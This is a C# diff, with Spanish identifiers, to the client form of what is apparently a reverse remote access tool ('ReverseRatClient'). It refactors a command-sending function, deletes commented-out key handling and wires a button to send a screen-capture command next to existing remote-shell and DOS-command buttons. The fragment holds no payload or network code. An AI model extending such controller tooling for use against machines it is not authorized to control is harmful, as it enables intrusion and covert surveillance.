@@ -18,10 +18,10 @@ namespace ReverseRatClient
 
         private void button3_Click(object sender, EventArgs e)
         {
-            ProcesarComandosDos(textBox2.Text);
+            ProcesarComandos(textBox2.Text);
         }
 
-        private void ProcesarComandosDos(string comando)
+        private void ProcesarComandos(string comando)
         {
             // Envia cualquier conmando DOS
             var pc = (Principal) Msc.DevolverMDI("Principal");
@@ -74,8 +74,7 @@ namespace ReverseRatClient
 
         private void button1_Click(object sender, EventArgs e)
         {
-            textBox2.Text = @"<:hola:>";
-            button3.PerformClick();
+            ProcesarComandos("<:hola:>");          
         }
 
         private void button2_Click(object sender, EventArgs e)
@@ -109,7 +108,7 @@ namespace ReverseRatClient
             if (e.KeyCode != Keys.Return)
                 button2.PerformClick();           
             else
-              ProcesarComandosDos(textBox2.Text);
+              ProcesarComandos(textBox2.Text);
         }
 
         private void tabControl1_SelectedIndexChanged(object sender, EventArgs e)
@@ -133,31 +132,11 @@ namespace ReverseRatClient
         }
 
         private void textBox1_KeyPress(object sender, KeyPressEventArgs e)
-        {
-
-          /*  if ((Control.ModifierKeys & Keys.Control) == Keys.Control)
-            {
-                if (Keyboard.IsKeyDown(Key.A))
-                {
-                    e.Handled = true;
-                }
-                if (Keyboard.IsKeyDown(Key.Z))
-                {
-                    e.Handled = true;
-                }
-            }*/
-
-            /*if (Convert.ToByte(e.KeyChar) == 8 && textBox1.Text.Substring(textBox1.SelectionStart - 1, 1) == ">") 
-                textBox1.ReadOnly = true;
-            else
-                textBox1.ReadOnly = false;*/
-
-           // MessageBox.Show(Convert.ToByte(e.KeyChar).ToString());
+        {        
         }
 
         private void textBox1_PreviewKeyDown(object sender, PreviewKeyDownEventArgs e)
-        {
-                          
+        {                          
             if ((e.KeyCode == Keys.Left || e.KeyCode == Keys.Back) && textBox1.Text.Substring(textBox1.SelectionStart - 1, 1) == ">")
                 textBox1.ReadOnly = true;
             else
@@ -181,7 +160,7 @@ namespace ReverseRatClient
         {
             textBox1.ReadOnly = false;
             textBox2.Text = "<:shell:>";
-            ProcesarComandosDos(textBox2.Text);
+            ProcesarComandos(textBox2.Text);
             EstablecerFuenteLetraShell();
             tabControl1.SelectTab(tabPage2);
             textBox1.Focus();
@@ -190,7 +169,7 @@ namespace ReverseRatClient
 
         private void button5_Click(object sender, EventArgs e)
         {
-
+            ProcesarComandos("<:captura:>");
         }
 
         private void groupBox2_Enter(object sender, EventArgs e)
